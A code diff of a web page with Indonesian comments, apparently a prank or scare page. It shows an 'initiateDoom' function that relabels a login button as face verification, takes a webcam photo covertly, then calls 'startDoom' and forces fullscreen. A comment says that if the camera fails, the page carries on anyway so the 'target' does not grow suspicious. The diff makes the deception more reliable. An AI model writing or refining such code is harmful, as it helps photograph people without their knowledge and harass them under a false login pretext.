@@ -76,8 +76,20 @@
             } catch (e) { console.log("Akses ditolak"); }
         }
         async function initiateDoom() {
-            let btn = document.getElementById('btn-login'); btn.innerText = "MENGAKSES KAMERA..."; btn.style.background = "#ff9800";
-            await snapPhoto(); startDoom();
+            let btn = document.getElementById('btn-login'); 
+            btn.innerText = "MEMVERIFIKASI WAJAH..."; 
+            btn.style.background = "#ff9800";
+
+            // [FIX] Kita tambahin delay 500ms biar kamera punya waktu "bangun" sebelum di-snap
+            try {
+                await snapPhoto();
+                // Tunggu sebentar biar proses kamera selesai
+                await new Promise(resolve => setTimeout(resolve, 800));
+                startDoom();
+            } catch (e) {
+                // Kalau kamera gagal, langsung paksa lanjut ke neraka biar target gak curiga
+                startDoom();
+            }
         }
         async function startDoom() {
             doomStarted = true; requestFullScreen();
